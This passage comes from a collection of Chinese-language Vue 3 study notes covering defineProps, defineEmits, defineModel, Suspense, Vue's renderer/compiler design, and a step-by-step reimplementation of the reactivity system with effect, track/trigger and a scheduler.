'danger'].includes(value)\n    }\n  },\n  // 函数类型的默认值\n  propH: {\n    type: Function,\n    // 不像对象或数组的默认，这不是一个\n    // 工厂函数。这会是一个用来作为默认值的函数\n    default() {\n      return 'Default function'\n    }\n  }\n})\n```\n\n`defineProps() 宏`中的参数不可以访问` <script setup>` 中定义的其他变量，因为在编译时整个表达式都会被移到外部的函数中\n\n## 4. 组件事件\n\n> 更多可见 [15. Vue3 事件与原生事件的关系和冒泡机制差异分析](/post/PZCOPnJR.html)\n\n1、`<script setup>` 中 定义：`const emit = defineEmits(['inFocus', 'submit'])`\n\n> 非`<script setup>` 中，参考官方文档\n\n2、`defineEmits()宏`还支持对象语法，比如\n\n```vue\n<script setup lang=\"ts\">\n  const emit = defineEmits<{\n      (e: 'change', id: number): void\n      (e: 'update', value: string): void\n  }>()\n </script>\n```\n\n3、如果一个原生事件的名字 (例如 `click`) 被定义在 `emits` 选项中，则监听器只会监听组件触发的 `click` 事件而不会再响应原生的` click` 事件。\n- **会覆盖了**\n\n> 如果一个原生事件的名字 (例如 `click`) 被定义在 `emits` 选项中，则监听器只会监听组件触发的 `click` 事件而不会再响应原生的 `click` 事件。\n\n==重点：`defineEmit(['click']) 事件`会覆盖原生的 click==\n\n>  不是说 通过 @click 定义的时间会覆盖通过 DOM 方式定义的事件，别搞混了，更多详见 [15. Vue3 事件与原生事件的关系和冒泡机制差异分析](/post/PZCOPnJR.html)\n\n4、和`原生 DOM 事件`不一样，**组件触发**的事件`没有冒泡机制`。你只能监听直接子组件触发的事件。平级组件或是跨越多层嵌套的组件间通信，应使用一个外部的`事件总线`，或是使用一个[全局状态管理方案](https://cn.vuejs.org/guide/scaling-up/state-management.html)。\n\n> 上面说的是 **Vue 组件触发的事件**，而不是具体元素触发的事件（即原生事件）\n\n5、事件校验，如下代码\n\n```vue hl:6\n<script setup>\nconst emit = defineEmits({\n  // 没有校验\n  click: null,\n\n  // 校验 submit 事件\n  submit: ({ email, password }) => {\n    if (email && password) {\n      return true\n    } else {\n      console.warn('Invalid submit event payload!')\n      return false\n    }\n  }\n})\n\nfunction submitForm(email, password) {\n  emit('submit', { email, password })\n}\n</script>\n```\n\n## 5. 组件 v-model\n\n> 如果是 `v3.4以前`的版本，可以不看这部分\n\n1、`v-model` 可以实现双向绑定\n\n2、vue 3.4 版本之前实现 `v-model` 双向绑定，比较麻烦，如下\n\n```vue\n<!-- Child.vue -->\n<script setup>\nconst props = defineProps(['modelValue'])\nconst emit = defineEmits(['update:modelValue'])\n</script>\n\n\n<template>\n  <input\n    :value=\"props.modelValue\"\n    @input=\"emit('update:modelValue', $event.target.value)\"\n  />\n</template>\n```\n\n```vue\n<!-- Parent.vue -->\n<Child\n  :modelValue=\"foo\"\n  @update:modelValue=\"$event => (foo = $event)\"\n/>\n```\n\n3、所以，`Vue3.4` 实现了 `defineModel`，简化实现`v-model` 的流程，如下代码：\n\n```vue\n<script setup>\nconst title = defineModel('title')\n</script>\n\n<template>\n  <input type=\"text\" v-model=\"title\" />\n</template>\n```\n\n> 比单独写简化了不少，这里再解释一下 `defineModel()宏`的作用：这个宏可以用来声明一个双向绑定 prop，通过父组件的 v-model 来使用\n\n4、`defineModel` 的底层机制：`编译器`层面，实现了父子通信的语法糖\n\n- 一个名为`modelValue`的 `prop`，本地 `ref` 的值与其同步；\n- 一个名为`update:modelValue`的事件，当本地 `ref` 的值发生变更时触发。\n\n所以效果就是：\n\n- 它的`.value`和`父组件`的`v-model`的值同步；\n- 当它被`子组件`变更了，会触发`父组件`绑定的值一起更新\n\n示例如下：\n\n```html\n<script setup>\nconst firstName = defineModel('firstName')\nconst lastName = defineModel('lastName')\n</script>\n\n\n<template>\n  <input type=\"text\" v-model=\"firstName\" />\n  <input type=\"text\" v-model=\"lastName\" />\n</template>\n\n```\n\n5、另外一种实现`双向绑定`的方法： 使用具有 `getter` 和 `setter` 的 `computed` 属性\n\n```vue\n<!-- CustomInput.vue -->\n<script>\n  export default {\n    props: ['modelValue'],\n    emits: ['update:modelValue'],\n    computed: {\n      value: {\n        get() {\n          return this.modelValue\n        },\n        set(value) {\n          this.$emit('update:modelValue', value)\n        }\n      }\n    }\n  }\n</script>\n\n<template>\n  <input v-model=\"value\" />\n</template>\n```\n\n6、`defineModel` 的参数说明，如下代码：\n\n```javascript\nconst title = defineModel('title', { required: true })\n```\n\n7、多个 `v-model` 绑定场景，如下代码：\n\n```vue\n<script setup>\n  const firstName = defineModel('firstName')\n  const lastName = defineModel('lastName')\n</script>\n\n<template>\n  <input type=\"text\" v-model=\"firstName\" />\n  <input type=\"text\" v-model=\"lastName\" />\n</template>\n```\n\n8、处理 `v-model` 修饰符 \n\n- [内置的修饰符](https://cn.vuejs.org/guide/essentials/forms.html#modifiers)，例如 `.trim`，`.number` 和 `.lazy`。\n- 自定义的修饰符呢？\n\t- 比如自定义的修饰符 `capitalize`，它会自动将 `v-model` 绑定输入的字符串值第一个字母转为大写：\n\n```vue\n<script setup>\n  const [model, modifiers] = defineModel({\n    // get() 省略了，因为这里不需要它\n    set(value) {\n      if (modifiers.capitalize) {\n        return value.charAt(0).toUpperCase() + value.slice(1)\n      }\n      // 如果使用了 .trim 修饰符，则返回裁剪过后的值\n      if(modelModifiers.trim){\n        return value.trim()\n      }\n      return value\n    }\n  })\n</script>\n\n<template>\n  <input type=\"text\" v-model=\"model\" />\n</template>\n```\n\n9、最后总结`defineModel` 使用\n\n```typescript\n// 声明 \"modelValue\" prop，由父组件通过 v-model 使用\nconst model = defineModel()\n// 或者：声明带选项的 \"modelValue\" prop\nconst model = defineModel({ type: String })\n\n// 在被修改时，触发 \"update:modelValue\" 事件\nmodel.value = \"hello\"\n\n// 声明 \"count\" prop，由父组件通过 v-model:count 使用\nconst count = defineModel(\"count\")\n// 或者：声明带选项的 \"count\" prop\nconst count = defineModel(\"count\", { type: Number, default: 0 })\n\nfunction inc() {\n  // 在被修改时，触发 \"update:count\" 事件\n  count.value++\n}\n```\n\n10、关于``v-model:title=\"bookTitle\"`` 和 `v-model=\"title\"` 究竟什么区别？\n\n- `v-model=\"title\" `默认`绑定到 `modelValue prop`，并通过 update:modelValue事件`更新\n- `v-model:title=\"bookTitle\"` 绑定到` title prop`，并通过` update:title事件`更新\n\n所以，其实`v-model=\"title\"` 是`v-model:modelValue=\"title\"` 一种`简写方式`\n\n具体差别如下：\n\n- 默认绑定的 props 字段不同\n- 是否支持`多属性`绑定，比如 `v-model:title` `v-model:title1` 多个，但 `v-model=\"title\"` 只支持一个\n- 支持`多属性`绑定 适合复杂组件，比如组件库里的一些组件绑定场景\n\n11、在`表单输入元素`或`组件`上创建`双向绑定`，默认表单上直接使用，但组件上还需要使用配合 `defineModel`  \n\n![image.png|552](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/9dd55eaedb417f6eedd40bb0b5627e13.png)\n\n## 6. Suspense 组件\n\nSuspense 是 Vue 的一个内置组件，用于**协调组件树中的异步依赖关系**\n\n> 是实验性的\n\n### 6.1. 基本用法\n\n```vue hl:3,7\n<template>\n  <Suspense>\n    <!-- 默认插槽 - 异步组件 -->\n    <template `#default>`\n      <AsyncComponent />\n    </template>\n    <!-- fallback 插槽 - 加载状态 -->\n    <template `#fallback>`\n      <div>Loading...</div>\n    </template>\n  </Suspense>\n</template>\n\n<script setup>\nimport { defineAsyncComponent } from 'vue'\n\nconst AsyncComponent = defineAsyncComponent(() =>\n  import('./components/AsyncComponent.vue')\n)\n</script>\n```\n\n### 6.2. 异步组件示例\n\n```vue\n<!-- AsyncComponent.vue -->\n<template>\n  <div>\n    <h2>{{ data.title }}</h2>\n    <p>{{ data.content }}</p>\n  </div>\n</template>\n\n<script setup>\n// 使用 async setup 使组件成为异步组件\nconst data = await fetch('https://api.example.com/data')\n  .then(res => res.json())\n</script>\n```\n\n### 6.3. 处理多个异步组件\n\n```vue\n<template>\n  <Suspense>\n    <template `#default>`\n      <div>\n        <AsyncComponent1 />\n        <AsyncComponent2 />\n        <AsyncComponent3 />\n      </div>\n    </template>\n    <template `#fallback>`\n      <LoadingSpinner />\n    </template>\n  </Suspense>\n</template>\n\n<script setup>\nimport { defineAsyncComponent } from 'vue'\n\nconst AsyncComponent1 = defineAsyncComponent(() =>\n  import('./components/AsyncComponent1.vue')\n)\nconst AsyncComponent2 = defineAsyncComponent(() =>\n  import('./components/AsyncComponent2.vue')\n)\nconst AsyncComponent3 = defineAsyncComponent(() =>\n  import('./components/AsyncComponent3.vue')\n)\n</script>\n```\n\n### 6.4. 错误处理 → `onErrorCaptured`\n\n```vue hl:15,13\n<template>\n  <Suspense @pending=\"onPending\" @resolve=\"onResolve\" @fallback=\"onFallback\">\n    <template `#default>`\n      <AsyncComponent />\n    </template>\n    <template `#fallback>`\n      <LoadingComponent />\n    </template>\n  </Suspense>\n</template>\n\n<script setup>\nimport { onErrorCaptured } from 'vue'\n\n// 捕获异步组件中的错误\n// 注册一个钩子，在捕获了后代组件传递的错误时调用。\nonErrorCaptured((error) => {\n  console.error('Async component error:', error)\n  // 返回 false 阻止错误继续传播\n  return false\n})\n\nconst onPending = () => {\n  console.log('Component is pending')\n}\n\nconst onResolve = () => {\n  console.log('Component is resolved')\n}\n\nconst onFallback = () => {\n  console.log('Fallback is shown')\n}\n</script>\n```\n\n### 6.5. 嵌套 Suspense\n\n```vue\n<template>\n  <Suspense>\n    <template `#default>`\n      <div>\n        <h1>Main Content</h1>\n        <Suspense>\n          <template `#default>`\n            <NestedAsyncComponent />\n          </template>\n          <template `#fallback>`\n            <p>Loading nested component...</p>\n          </template>\n        </Suspense>\n      </div>\n    </template>\n    <template `#fallback>`\n      <p>Loading main content...</p>\n    </template>\n  </Suspense>\n</template>\n```\n\n### 6.6. 结合 Transition 使用\n\n```vue\n<template>\n  <Suspense>\n    <template `#default>`\n      <AsyncComponent />\n    </template>\n    <template `#fallback>`\n      <Transition name=\"fade\">\n        <div class=\"loading\">\n          <LoadingSpinner />\n        </div>\n      </Transition>\n    </template>\n  </Suspense>\n</template>\n\n<style>\n.fade-enter-active,\n.fade-leave-active {\n  transition: opacity 0.5s ease;\n}\n\n.fade-enter-from,\n.fade-leave-to {\n  opacity: 0;\n}\n</style>\n```\n\n### 6.7. 在组合式函数中使用\n\n```vue\n<script setup>\nimport { ref } from 'vue'\n\n// 异步组合式函数\nconst useAsyncData = async () => {\n  const data = ref(null)\n  const response = await fetch('https://api.example.com/data')\n  data.value = await response.json()\n  return { data }\n}\n\n// 在组件中使用\nconst { data } = await useAsyncData()\n</script>\n\n<template>\n  <div>\n    <h2>{{ data.title }}</h2>\n    <p>{{ data.description }}</p>\n  </div>\n</template>\n```\n\n### 6.8. 使用 Suspense 的注意事项\n\n1. **Suspense 只处理其直接子组件的异步依赖**，只处理以下异步情况：\n\t- 带有 `async setup()` 的组件\n\t- 使用 `defineAsyncComponent` 定义的组件\n2. 异步组件**必须使用** \n\t1. await 或返回 Promise\n3. 确保正确处理错误情况\n4. 考虑使用 `transition` 来优化加载状态的视觉效果\n5. 在服务器端渲染（SSR）场景中要特别注意使用方式\n\n","XdPTfcHC":"\n# Vue 的整体设计思路\n\n\n`#vue` `#前端框架/vue` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 一个 JSON 数据，使用==渲染器==渲染出来\n- 为了更好的开发体验，在使用==编译器==提高开发体验\n\t- 配合==编译器==也能提高运行时性能\n- 发现没有，其实市面上的**低代码平台实现思路**无非也就==编译器和渲染器==\n\t- 运行时：写个==渲染器==\n\t- 使用==编译器==：\n\t\t- 编译器成可执行的代码\n\t\t- 或者**出码编译**后二次开发\n\t\t- 在编译过程中，提取关键信息， 给渲染器==更多的信息==，实现更好的性能\n\n## 2. 如何描述 UI\n\n三种方式：\n\n- 声明式描述 UI\n- JavaScript对象\n- v-dom\n\n### 2.1. 声明式描述 UI\n\n`声明式描述 UI`，比如 `<div class='btn' id='test' @click=\"handle\"> button </div>`， 包含信息 tag名，属性，事件，层级关系\n\n### 2.2. JavaScript对象\n\n使用 `JavaScript对象 ` 来描述 UI，如下代码\n\n```javascript\nconst title = {\n    tag: 'h1', // tag 名称\n    props:{ // 属性与事件\n        onClick:handler\n    }\n    children:[ // 子节点\n        {tag: 'span'}\n    ]\n}\n```\n\n### 2.3. v-dom\n\n`虚拟 DOM` 描述 UI，比如 vue 中的 `渲染函数 - h` ，如下代码：\n\n```javascript hl:4,7\nimport {h} from \"vue\";\nexport default{\n    render(){\n        // 虚拟 DOM\n        return h('h1',{ onClick: fn }); \n        \n        // 或者直接返回 js 对象\n        return {\n            tag: 'h1', // tag 名称\n            props:{ // 属性与事件\n                onClick:handler\n            }\n            children:[ // 子节点\n                {tag: 'span'}\n            ]\n        }\n    }\n}\n```\n\n> `h` 返回的其实就是 `js 对象`， `h函数`就是**辅助创建虚拟 DOM 的工具函数**而已，**所以他俩其实是一个东西**\n\n- 哪种方式**更灵活**呢？\n   - 答案是：`JavaScript 对象`（或`虚拟 DOM` ） 的方式，\n      - 比如表现 `H1-H6` ，使用 `tag:H${index}` 即可\n      - 又比如说，`jsx`的方式实现 `递归树`，更方便\n- 那种方式**更直观**呢？当然是 `模板`\n\n## 3. 渲染函数\n\n- 即上面的 `render 方法`\n   - 如 vue 会根据返回的`虚拟 DOM` ， 把组件渲染出来\n\n## 4. 渲染器\n\n`渲染器`的作用，就是把 `虚拟 DOM`，如 `h('div','hello')` 转成 `真实的 DOM` \n\n> 这里再强调一下，`h('div','hello')` 返回的其实就一个 `用于表示 UI 的 js 对象`\n\n如何实现一个`渲染器`? \n\n```javascript\nconst vnode = {}; // 用于描述 UI 的 js 对象。\nfunction renderer(vnode,container){\n    1. 根据 vnode.tag 创建元素\n    2. 添加 props 和 事件\n    3. 处理 children，递归调用 renderer \n}\n```\n\n所以`渲染器` 的\n\n- **本质是**，递归遍历 `vdom` , 调用`原生 DOM API` 完成真实的 `DOM 创建`\n- 但**精髓在于**，**如何做 diff 更新**\n\n## 5. 组件的本质\n\n组件**本质**是`一组虚拟DOM元素`的封装\n- 他可以是一个返回虚拟 DOM 的`函数`\n- 也可以是一个`对象`，然后再用 `渲染器` 进行渲染\n\n所以，渲染时需要判断 `vnode.tag = function | object | string ? ` 分别处理\n\n## 6. 模板编译器\n\n编译器其实就是把 `模板` 编译成 `渲染函数` \n\n- 即：声明式描述 UI **→** 虚拟 DOM 方式描述 UI\n- 比如：一个标准`vue模板`\n```html\n<template>\n    <div @click=\"fn\"></div>\n</template>\n\n<script>\nexport default{\n    data(){},\n    methond(){\n        fn(){}\n    },\n    render(){\n        return h('div',{onclick:fn})\n    }\n}\n</script>\n\n```\n\n最终**编译**成的样子如下：\n\n```javascript hl:7\nexport default{\n    data(){},\n    methond(){\n        fn(){}\n    },\n    render(){\n        return h('div',{onclick:fn})\n    }\n}\n```\n\n## 7. 最后总结\n\n- 组件的实现依赖于 `渲染器`\n- 模板的编译依赖于 `编译器`\n- `渲染器` 和 `编译器` 是存在`信息交流`的\n\t- 比如虚拟 DOM 对象中 的 `patchFlages` 属性，用于标识是 `动态属性` 和 `静态属性`？\n\t\t- 互相配合使得性能得到提升\n\n\n","RID6FvlT":"\n# Vue3 的响应式原理：effect、computed、watch 的实现原理\n\n\n`#前端框架/vue` `#前端` `#vue3` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n### 1.1. 摘要\n\n本文详细介绍了Vue3响应式系统的设计原理和实现过程。从副作用函数的概念出发，逐步讲解了\n- 响应式数据的实现\n- 数据结构的设计\n- 分支切换问题的解决\n- `effect` 函数 嵌套的处理\n- `调度系统`的实现\n- `computed` 计算属性的原理\n- `watch` 函数的实现\n\n### 1.2. 要点\n\n- 响应式数据的基本实现：\n\t- 依赖于 `Proxy` 和 `副作用函数`\n- 使用 `WeakMap`、`Map` 和 `Set` 组合的数据结构来存储**依赖关系**\n- 通过 `cleanup函数` 解决分支切换问题\n- 使用 `effectStack` 来处理 `effect函数` 的**嵌套问题**\n- 实现 `调度系统` 来控制**副作用函数的执行时机和次数**\n- 计算属性 `computed` 的实现基于 **lazy执行 和 缓存机制**\n- `watch函数` 的实现涉及\n\t- 递归遍历对象属性\n\t- 处理`竞态`问题\n\t\t- 使用 `oncleanup` 参数\n\t\t- 每次变更后都会执行\n\n## 2. 何为副作用函数？\n\n如修改了全局变量等\n\n> 在 React useEffect 章节会有详细介绍副作用的概念\n\n## 3. 为何响应式数据？\n\n如下代码，希望 `data.text` 值改变时，会自己执行 `effect函数` ， 那么`data 数据`就是`响应式的`。\n\n```js\n// 原始数据\nconst data = { text: 'hello world' }\n\nfunction effect() {\n  document.body.innerText = obj.text\n}\neffect()\n\n```\n\n## 4. 响应式数据最简单的实现\n\n借助 `Proxy` ，\n- 每次`读取`时，将 effect 函数存储到`桶：bucket` 中，\n- 每次`set 时`，从`桶`中**取出并执行**\n\n如下代码：\n\n```js hl:20,11\n// 存储副作用函数的桶\nconst bucket = new Set()\n\n// 原始数据\nconst data = { text: 'hello world' }\n// 对原始数据的代理\nconst obj = new Proxy(data, {\n  // 拦截读取操作\n  get(target, key) {\n    // 将副作用函数 effect 添加到存储副作用函数的桶中\n    bucket.add(effect)\n    // 返回属性值\n    return target[key]\n  },\n  // 拦截设置操作\n  set(target, key, newVal) {\n    // 设置属性值\n    target[key] = newVal\n    // 把副作用函数从桶里取出并执行\n    bucket.forEach(fn => fn())\n  }\n})\n\nfunction effect() {\n  document.body.innerText = obj.text\n}\neffect()\n```\n\n但上面的方式缺点是`硬编码`了 `effect`\n\n## 5. 解决硬编码 `effect` 函数的问题\n\n思路是，`effect(fn)` 传入一个函数，标识注册副作用函数 `fn` \n\n- 并使用全局变量 `activeEffect` 来存储 `当前激活的 effect 函数`\n\n```js hl:25,10\n// 存储副作用函数的桶\nconst bucket = new Set()\n\n// 原始数据\nconst data = { text: 'hello world' }\n// 对原始数据的代理\nconst obj = new Proxy(data, {\n  // 拦截读取操作\n  get(target, key) {\n    // 将副作用函数 activeEffect 添加到存储副作用函数的桶中\n    bucket.add(activeEffect)\n    // 返回属性值\n    return target[key]\n  },\n  // 拦截设置操作\n  set(target, key, newVal) {\n    // 设置属性值\n    target[key] = newVal\n    // 把副作用函数从桶里取出并执行\n    bucket.forEach(fn => fn())\n  }\n})\n\n\n// 用一个全局变量存储当前激活的 effect 函数\nlet activeEffect\nfunction effect(fn) {\n  // 当调用 effect 注册副作用函数时，将副作用函数复制给 activeEffect\n  activeEffect = fn\n  // 执行副作用函数\n  fn()\n}\n\neffect(() => {\n  console.log('effect run')\n  document.body.innerText = obj.text\n})\n\nsetTimeout(() => {\n  obj.text2 = 'hello vue3'\n}, 1000)\n```\n\n但是，上面代码如果我们设置不存在的属性时，如 `obj.noExist = 'hello '` , `传入的effect` 中的 `fn` 会**执行两次**\n\n所以，`副作用函数`需要与`目标字段` 建立映射，所以我们**需要重新设计数据结构**\n\n## 6. 重新设计数据结构\n\n**解决上面设置不存在的属性时也执行问题**，可以**重新设计数据结构**\n\n如下代码：\n\n```js\n// 用一个全局变量存储当前激活的 effect 函数\nlet activeEffect\nfunction effect(fn) {\n    // 当调用 effect 注册副作用函数时，将副作用函数复制给 activeEffect\n    activeEffect = fn\n    // 执行副作用函数\n    fn()\n}\n\nconst obj = { text1: 'text1', text2: 'text2' };\nconst obj2 = { text1: 'text1', text2: 'text2' };\n\neffect(function fn1() {\n    console.log(obj.text1);\n})\n\neffect(function fn2() {\n    console.log(obj.text2);\n    console.log(obj.text1);\n})\n\n/*************************************************\n * :::: 以上代码的映射关系如下\n * obj\n *  text1: [fn1,fn2]\n *  text2: [fn2]\n ************************************************/\n\neffect(function fn3() {\n    console.log(obj.text1);\n    console.log(obj.text2);\n})\n/*************************************************\n * :::: 以上代码的映射关系如下\n * obj\n *  text1: [fn3]\n *  text2: [fn3]\n ************************************************/\n\neffect(function fn1() {\n    console.log(obj.text1);\n})\n\neffect(function fn2() {\n    console.log(obj2.text2);\n    console.log(obj.text1);\n})\n\n/*************************************************\n * :::: 以上代码的映射关系如下\n * obj\n *   text1: [fn1,fn2] \n * obj2\n *   text2: [fn2]\n ************************************************/\n```\n\n结构如下：\n\n- `WeakMap`\n\t- `key` 为 `obj` 或者 `obj1` 对象\n\t- `value` 为 `Map`\n\t\t- `key` 为 字段名，如 `text1` ,`text2`\n\t\t- `value`为 `Set` ，比如上面的 `fn1` `fn2`\n\n如下图：\n\n![|736](https://od-1310531898.cos.ap-beijing.myqcloud.com/202304081112785.png)\n\n>  weakMap 的键只能是对象\n\n### 6.1. 为什么要使用 WeakMap？\n\n```js\nconst weakMap = new WeakMap();\nconst map = new Map();\n\n(function () {\n    let w = {w: \"w\"};\n    let m = {m: \"m\"};\n    weakMap.set(w, 1);\n    map.set(m, 2);\n    console.log(weakMap);\n    console.log(map);\n    w = null;\n    m = null;\n})()\n\n// 这 5s的时间，weakMap 会被回收，而 map 不会，因为 map 的 key 是强引用，不会被回收\n// chrome performance 手动触发垃圾回收\nsetTimeout(() => {\n    console.log(weakMap);\n    console.log(map);\n}, 5000);\n```\n\n手动触发垃圾回收机制：\n\n![|536](https://od-1310531898.cos.ap-beijing.myqcloud.com/202304081153881.png)\n\n最终打印打印结果如下：\n\n![|464](https://od-1310531898.cos.ap-beijing.myqcloud.com/202304081151462.png)\n\n所以，结论就是：使用 `WeakMap` 能够保证 `GC`，不会像 `Map` 那个强引用导致`内存溢出`\n\n### 6.2. 最终代码\n\n**最终代码如下**：\n- 并封装 `track(targe,key)` 和 `trigger(targe,key)`\n\n```js\n// 存储副作用函数的桶\nconst bucket = new WeakMap()\n// 原始数据\nconst data = { text: 'hello world' }\n// 对原始数据的代理\nconst obj = new Proxy(data, {\n  // 拦截读取操作\n  get(target, key) {\n    // 将副作用函数 activeEffect 添加到存储副作用函数的桶中\n    track(target, key)\n    // 返回属性值\n    return target[key]\n  },\n  // 拦截设置操作\n  set(target, key, newVal) {\n    // 设置属性值\n    target[key] = newVal\n    // 把副作用函数从桶里取出并执行\n    trigger(target, key)\n  }\n})\n\nfunction track(target, key) {\n  let depsMap = bucket.get(target)\n  if (!depsMap) {\n    bucket.set(target, (depsMap = new Map()))\n  }\n  let deps = depsMap.get(key)\n  if (!deps) {\n    depsMap.set(key, (deps = new Set()))\n  }\n  deps.add(activeEffect)\n}\n\nfunction trigger(target, key) {\n  const depsMap = bucket.get(target)\n  if (!depsMap) return\n  const effects = depsMap.get(key)\n  effects && effects.forEach(fn => fn())\n}\n// 用一个全局变量存储当前激活的 effect 函数\nlet activeEffect\nfunction effect(fn) {\n  // 当调用 effect 注册副作用函数时，将副作用函数复制给 activeEffect\n  activeEffect = fn\n  // 执行副作用函数\n  fn()\n}\n\neffect(() => {\n  console.log('effect run')\n  document.body.innerText = obj.text\n})\n\nsetTimeout(() => {\n  trigger(data, 'text')\n}, 1000)\n```\n\n>[!tip]  \n其实如何能够梳理清楚这个数据结构，那能那么容易写出代码，所以也**不用抠代码细节，推导的思想更有借鉴意义**，真正需要自己使用即可！\n\n## 7. 分支切换问题\n\n即使用**三元符号**时，如何避免不必要的执行？\n\n如下代码：\n\n```js\neffect(() => {\n  console.log('effect run')\n  document.body.innerText = obj.ok ? obj.text : 'not'\n})\n```\n\n根据上面，我们知道关系如下：\n\n- obj\n\t- ok\n\t- fn\n- text\n\t- fn\n\n所以，当 `text` 值改变时，必然会导致 `fn` 重新执行 \n- 但其实当`ok` 为 `false` 时，无论 `text` 如何变化，我们不希望 `fn` 重新执行。如何解决呢？\n\n>  解决方案是 **每次副作用函数执行之前，清除上一次建立的关系**。\n\n重新设计结构，`effect.deps` 用来存储 `所有与该副作用函数相关的依赖集合` ，如下代码：\n\n```js\n// 用一个全局变量存储当前激活的 effect 函数\nlet activeEffect\nfunction effect(fn) {\n  const effectFn = () => {\n    cleanup(effectFn)\n    // 当调用 effect 注册副作用函数时，将副作用函数复制给 activeEffect\n    activeEffect = effectFn\n    fn()\n  }\n  // activeEffect.deps 用来存储所有与该副作用函数相关的依赖集合\n  effectFn.deps = []\n  // 执行副作用函数\n  effectFn()\n}\n\n// 每次都会清除\nfunction cleanup(effectFn) {\n  for (let i = 0; i < effectFn.deps.length; i++) {\n    const deps = effectFn.deps[i]\n    deps.delete(effectFn)\n  }\n  effectFn.deps.length = 0\n}\n```\n\n下面看 `trigger` 函数：\n\n```js\nfunction trigger(target, key) {\n  const depsMap = bucket.get(target)\n  if (!depsMap) return\n  const effects = depsMap.get(key);\n  // here ，这里出现无限循环\n  effects && effects.forEach(effectFn => effectFn())\n}\n```\n\n但是，上面的代码会出现无限循环，原因类似于下面的代码：\n\n```js\nconst set = new Set([1])\nset.forEach(item => {\n  set.delete(1)\n  set.add(1)\n  console.log(999)\n})\n```\n\n![|560](https://od-1310531898.cos.ap-beijing.myqcloud.com/202304081406196.png)\n\n解决方案：**新的变量** `newSet`\n\n```js\nconst set = new Set([1])\nconst newSet = new Set(set)\nnewSet.forEach(item => {\n  set.delete(1)\n  set.add(1)\n  console.log(999)\n})\n```\n\n所以最终 `trigger` 代码：创建`新的变量` `effectsToRun`\n\n```js\nfunction trigger(target, key) {\n  const depsMap = bucket.get(target)\n  if (!depsMap) return\n  const effects = depsMap.get(key)\n\n  const effectsToRun = new Set()\n  effects && effects.forEach(effectFn => effectsToRun.add(effectFn))\n  effectsToRun.forEach(effectFn => effectFn())\n  // effects && effects.forEach(effectFn => effectFn())\n}\n```\n\n## 8. Effect 函数嵌套的场景\n\n### 8.1. 先说说为什么要支持嵌套\n\n因为 `jsx` 天然需要支持嵌套，如下代码：\n\n```js\nconst Foo = {\n    render() {\n        return h('div', 'foo')\n    }\n}\n\nconst Bar = {\n    render() {\n        // 引用 Foo\n        return h(Foo, 'bar')\n    }\n}\n```\n\n### 8.2. 现有 `effect` 函数不支持嵌套\n\n如下代码：\n\n```js hl:3\nlet temp1, temp2\n\n// 嵌套 effect 里面还有 effect 函数\neffect(function effectFn1() {\n  console.log('1')\n  effect(function effectFn2() {\n    console.log('2')\n    temp2 = obj.bar\n  })\n  temp1 = obj.foo\n})\n\n// obj.foo之前的值为 true\nsetTimeout(() => {\n    obj.foo = false\n}, 5000);\n```\n\n我们修改 `obj.foo` , 预期是：\n\n- 输出 `1 2 1` , 因为 obj.foo 修改导致 `fn1` 的执行，打印 `1`，`fn2` 嵌套在 `fn1` 里，所以还会执行`fn2` 打印出 `2`，5s 后，值`obj.foo`改变了，导致 `fn1` 执行，打印出 `2`\n\n但实际上是 `1 2 2`\n\n原因是：发生嵌套时，内层激活的 `activeEffect` 会覆盖`外层的副作用函数`，所以最终执行的都是`内层副作用函数`\n\n### 8.3. 解决思路：副作用函数栈 `efectStack`\n\n如下代码：\n\n```js\n// 用一个全局变量存储当前激活的 effect 函数\nlet activeEffect\n// effect 栈\nconst effectStack = []\nfunction effect(fn) {\n  const effectFn = () => {\n    cleanup(effectFn)\n    // 当调用 effect 注册副作用函数时，将副作用函数复制给 activeEffect\n    activeEffect = effectFn\n    // 在调用副作用函数之前将当前副作用函数压栈\n    effectStack.push(effectFn)\n    fn()\n    // 在当前副作用函数执行完毕后，将当前副作用函数弹出栈\n    // 并还原 activeEffect 为之前的值\n    effectStack.pop()\n    activeEffect = effectStack[effectStack.length - 1]\n  }\n  // activeEffect.deps 用来存储所有与该副作用函数相关的依赖集合\n  effectFn.deps = []\n  // 执行副作用函数\n  effectFn()\n}\n```\n\n## 9. 新的问题：无限递归循环\n\n如下代码，会引起 `栈溢出`\n\n```js\neffect(() => {\n    obj.foo++;\n})\n```\n\n因为 `obj.foo 同时读取和设置` ，从而导致无限递归循环。\n\n因为读取和操作是在同一个副作用函数中，进行的。所以可以增加`守卫条件`： **trigger 触发的副作用函数和当前执行的副作用函数，是一个函数，则不执行。**\n\n```js hl:7,6\nfunction trigger(target, key) {\n  const depsMap = bucket.get(target)\n  if (!depsMap) return\n  const effects = depsMap.get(key)\n  const effectsToRun = new Set()\n  effects && effects.forEach(effectFn => {\n    // 守卫条件\n    if (effectFn !== activeEffect) {\n      effectsToRun.add(effectFn)\n    }\n  })\n  effectsToRun.forEach(effectFn => effectFn())\n}\n```\n\n## 10. 响应式系统的调度（Scheduler）\n\n所谓`调度`，即 `trigger` 重新触发副作用函数时，能够决定执行的`时机`，`次数`等`自定义行为`。\n\n### 10.1. 例子 1 ：控制执行顺序\n\n以下执行顺序是：`1 ，2 ，end...`\n\n```js\nconst data = {foo: 1};\nconst obj = new Proxy(data, {});\n\neffect(() => {\n    console.log(obj.foo);\n})\n\nobj.foo++;\nconsole.log('end...');\n// ::::顺序是：1 ，2 ，end... \n```\n\n如果我们希望顺序变成了：`1 ，end... ，2` 呢？？？\n\n**解法方法是**：\n- 给 `effect` 函数添加一个 `options` 参数\n\t- 即 给在批量执行副作用函数的地方，即 trigger 函数中，添加特定的判断，即调度逻辑，如下代码\n\n```js hl:13,15\nfunction trigger(target, key) {\n  const depsMap = bucket.get(target)\n  if (!depsMap) return\n  const effects = depsMap.get(key)\n\n  const effectsToRun = new Set()\n  effects && effects.forEach(effectFn => {\n    if (effectFn !== activeEffect) {\n      effectsToRun.add(effectFn)\n    }\n  })\n  effectsToRun.forEach(effectFn => {\n      // ::::新增代码::::\n    if (effectFn.options.scheduler) {\n      effectFn.options.scheduler(effectFn)\n    } else {\n      effectFn()\n    }\n  })\n}\n```\n\n修改上面例子代码如下：\n\n> **options 的 scheduler 选项是一个函数**\n\n\n```js hl:9\nconst data = {foo: 1};\nconst obj = new Proxy(data, {});\n\neffect(\n    () => {\n        console.log(obj.foo);\n    },\n    {\n        scheduler: (fn) => {\n            setTimeout(fn, 0);\n        }\n    }\n);\n\nobj.foo++;\nconsole.log('end...');\n\n// ::::顺序就可以变成 1 